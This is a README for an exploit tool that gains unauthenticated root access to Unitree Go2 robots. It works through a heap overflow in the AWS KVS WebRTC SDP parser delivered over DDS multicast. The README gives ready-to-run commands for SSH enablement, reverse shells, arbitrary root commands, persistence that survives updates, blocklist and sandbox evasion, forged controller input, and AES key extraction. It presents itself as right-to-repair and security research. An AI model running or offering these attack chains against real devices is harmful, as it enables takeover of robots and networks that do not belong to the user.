<div align="center">

```
 _   _       _                    _
| | | |_ __ | |    ___  __ _ ___| |__
| | | | '_ \| |   / _ \/ _` / __| '_ \
| |_| | | | | |__|  __/ (_| \__ \ | | |
 \___/|_| |_|_____\___|\__,_|___/_| |_|
                  lite
```

**Root access for the Unitree Go2. Your robot, your rules.**

</div>

UnLeash Lite uploads Python payloads to the Go2 over its WebRTC data channel and executes them as root. The primary delivery method is an SDP buffer overflow that works pre-auth over the LAN -- no AES keys, no cloud credentials, no physical controller required.

## Quick Start

```bash
pip install .
pip install 'unleash-lite[sdp]'

python -m unleash_lite sdp-jailbreak bypass-ssh
```

Wait up to 60 seconds for the cron job, then:

```bash
ssh root@192.168.123.161
# password: unleash
```

No controller press needed. The tool sends a fake button input over DDS automatically.

> **Custom password:** Add `--password <your-password>` to the sdp-jailbreak command.

### What just happened?

1. A crafted SDP offer was delivered to the robot via DDS multicast, bypassing HTTP signaling entirely
2. A heap buffer overflow in `parseMediaAttributes()` (AWS KVS WebRTC SDK < v1.18.1) injected our DTLS fingerprint into the robot's PeerConnection
3. A WebRTC data channel was established using the forged fingerprint
4. A bypass payload was uploaded to `programming_actuator` and bound to the L1+Y hotkey
5. A fake controller button press was published over DDS to trigger execution
6. The payload wrote a self-deleting cron job that enables SSH and sets the root password

The entire chain is pre-auth. No AES key. No cloud login. No HTTP signaling. No physical controller.

## Install

```bash
pip install .

# Required for SDP overflow:
pip install 'unleash-lite[sdp]'
```

The `sdp` extra installs `cyclonedds==0.10.2`. This version must match the robot's CycloneDDS -- v0.11+ has incompatible SEDP discovery and will not work. cyclonedds 0.10.2 requires Python 3.10 through 3.13 (it will not build on 3.14+).

## Firmware Support

| Firmware | SDP Overflow | HTTP Signaling | Status |
|----------|-------------|----------------|--------|
| 1.1.7 -- 1.1.11 | `sdp-jailbreak bypass-ssh` | `ssh` | Confirmed |
| 1.1.12 -- 1.1.13 | `sdp-jailbreak bypass-ssh` | `ssh` | Untested (should work) |
| 1.1.14 | `sdp-jailbreak bypass-ssh` | `bypass-ssh` | Confirmed |
| 1.1.15 | `sdp-jailbreak bypass-ssh` | `bypass-ssh --aes-key KEY` | Confirmed |

The SDP overflow bypasses HTTP signaling and per-device authentication entirely. The `--aes-key` flag is never needed with `sdp-jailbreak`.

> **Tip:** On firmware <= 1.1.13, `sdp-jailbreak ssh` is faster than `sdp-jailbreak bypass-ssh` because it enables SSH immediately instead of going through a cron job. Both work on all firmware, but the `ssh` payload will be rejected by the keyword blocklist on 1.1.14+.

## Modes

| Mode | Firmware | Description |
|------|----------|-------------|
| `ssh` | <= 1.1.13 | Enable SSH and set root password |
| `ssh-persist` | <= 1.1.13 | Persistent SSH with guard service (survives reboots + OTA) |
| `custom` | <= 1.1.13 | Run any shell command as root |
| `reverse-shell` | <= 1.1.13 | Reverse shell to a specified IP |
| `bypass-ssh` | all | Enable SSH via cron job (bypasses keyword blocklist) |
| `bypass-hosts` | all | Write MQTT DNS redirect to `/etc/hosts` |
| `bypass-file` | all | Write arbitrary file content |
| `bypass-cron` | all | Install a cron job for command execution |
| `bypass-escalate` | all | Two-press self-overwrite for unfiltered Python execution |

The `bypass-*` modes encode payloads as byte arrays and use `np.savetxt` for file I/O, evading the keyword blocklist added in firmware 1.1.14 ([CVE-2026-27509](https://nvd.nist.gov/vuln/detail/CVE-2026-27509)). `bypass-ssh` and `bypass-cron` escape the seccomp sandbox by staging commands as cron jobs.

All modes work with both `sdp-jailbreak` and the HTTP signaling path.

## HTTP Signaling (Legacy)

The original delivery method uses the robot's HTTP signaling endpoint on port 9991. This is the same endpoint the Unitree app connects through. It works without CycloneDDS but requires a physical controller to trigger the payload, and on firmware >= 1.1.15 it requires a per-device AES key.

### Firmware <= 1.1.13

```bash
python -m unleash_lite ssh
```

Press **L1+Y** on the controller. Then `ssh root@192.168.123.161` (password: `unleash`).

### Firmware 1.1.14

```bash
python -m unleash_lite bypass-ssh
```

Press **L1+Y**, wait up to 60 seconds. Then `ssh root@192.168.123.161`.

### Firmware >= 1.1.15

```bash
# Fetch your device key from the Unitree cloud
python -m unleash_lite fetch-key --email you@example.com

# Run the jailbreak
python -m unleash_lite bypass-ssh --aes-key <your-32-hex-char-key>
```

Press **L1+Y**, wait up to 60 seconds. Then `ssh root@192.168.123.161`.

If you already have SSH access, you can read the key directly:

```bash
ssh root@192.168.123.161 'xxd -p /unitree/etc/key/aes_key.bin'
```

## DDS Controller Trigger

The `trigger` subcommand sends a fake controller button press over DDS multicast without needing a physical Unitree remote:

```bash
python -m unleash_lite trigger                          # default: L1+Y
python -m unleash_lite trigger --hotkey L2+Y
python -m unleash_lite trigger --interface-ip 192.168.123.100
```

`sdp-jailbreak` runs this automatically after uploading the payload. The standalone `trigger` command is useful when you've uploaded a payload through some other means and just need to fire it.

## CLI Reference

### sdp-jailbreak

```bash
python -m unleash_lite sdp-jailbreak <mode> [options]
```

```
--interface-ip IP     Network interface IP for DDS multicast (auto-detected)
--hotkey HOTKEY       Controller hotkey binding (default: L1+Y)
--password PASS       Root password for ssh modes (default: unleash)
--cmd CMD             Shell command for custom / bypass-cron mode
--attacker-ip IP      Target IP for reverse-shell / bypass-hosts
--file-path PATH      Target file path for bypass-file mode
--content TEXT        File content for bypass-file mode
--code CODE           Unfiltered Python code for bypass-escalate mode
--callback-ip IP      This machine's IP for verification (auto-detected)
--callback-port PORT  Callback listener port (default: 19999)
--no-callback         Skip callback verification
--timeout SECS        Callback wait timeout (default: 120s)
--debug               Enable debug logging
```

### HTTP signaling modes

```bash
python -m unleash_lite <mode> [options]
```

Same options as sdp-jailbreak, plus:

```
--robot-ip IP         Robot IP address (default: 192.168.123.161)
--port PORT           WebRTC signaling port (default: 9991)
--aes-key KEY         Per-device AES-128 key for firmware >= 1.1.15 (32 hex chars)
```

### Other subcommands

```bash
python -m unleash_lite fetch-key --email you@example.com [--sn SERIAL]
python -m unleash_lite probe [--aes-key KEY] [--debug]
python -m unleash_lite trigger [--hotkey L1+Y] [--interface-ip IP]
```

## How the SDP Overflow Works

The Unitree Go2's `webrtc_bridge` service uses the AWS Kinesis Video Streams (KVS) WebRTC SDK to handle peer connections. It reads WebRTC offers from the DDS topic `rt/webrtcreq` and passes them to the SDK's SDP parser.

`parseMediaAttributes()` in the KVS SDK (versions before v1.18.1) allocates a fixed-size array for SDP attributes but does not bounds-check the count. The crafted SDP contains 5 media descriptions. The last one (`m=application`) carries 256 attributes. The 256th has a 522-byte name ending in `\x01\x01`, which overflows into `sessionAttributesCount` in the SDK's session descriptor struct, corrupting it to 257. The session attribute loop then reads index 256, which maps into the first media description's `mediaName` and `mediaTitle` fields. We place our DTLS fingerprint there, so it gets written into the PeerConnection's expected fingerprint.

With the forged fingerprint accepted, the DTLS handshake succeeds and a data channel opens. A use-after-free in the SDK kills the connection roughly 1-2 seconds later, so the tool fires the validation handshake and payload upload immediately in the data channel message handler.

The overflow SDP is delivered and the answer received entirely over DDS multicast (`rt/webrtcreq` / `rt/webrtcres`), which is unauthenticated. No HTTP signaling, no AES key exchange, no RSA encryption.

## Acknowledgments

This tool builds on publicly disclosed security research by multiple independent teams.

**Olivier Laflamme (Boschko) and Ruikai Peng** discovered that `programming_actuator` executes arbitrary Python as root with no authentication ([CVE-2026-27509](https://nvd.nist.gov/vuln/detail/CVE-2026-27509)). Their exploit reaches it by joining DDS domain 0 directly on the LAN. Their writeup at [boschko.ca](https://boschko.ca/unitree-go2-rce/) documents the DDS attack chain.

**Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581)** disclosed the broader Unitree security architecture weaknesses ([CVE-2025-35027](https://nvd.nist.gov/vuln/detail/CVE-2025-35027), [arXiv:2509.14139](https://arxiv.org/abs/2509.14139)): hardcoded AES keys, the WebRTC signaling protocol, and fleet-wide shared cryptographic material. legion1581's [`unitree_webrtc_connect`](https://github.com/legion1581/unitree_webrtc_connect) was foundational for the WebRTC data channel implementation.

The SDP overflow was discovered and responsibly disclosed to AWS through their Vulnerability Disclosure Program. AWS patched the issue in KVS WebRTC SDK v1.18.1. Unitree was notified concurrently but has not responded.

## Legal

This software is provided for **security research, education, and right-to-repair purposes only**. By using it, you agree that:

- You own the robot you are targeting, or have explicit written authorization from its owner.
- You are solely responsible for complying with all applicable local, state, national, and international laws.
- The authors and contributors accept no liability for damages, legal consequences, or misuse arising from this software.

## License

MIT
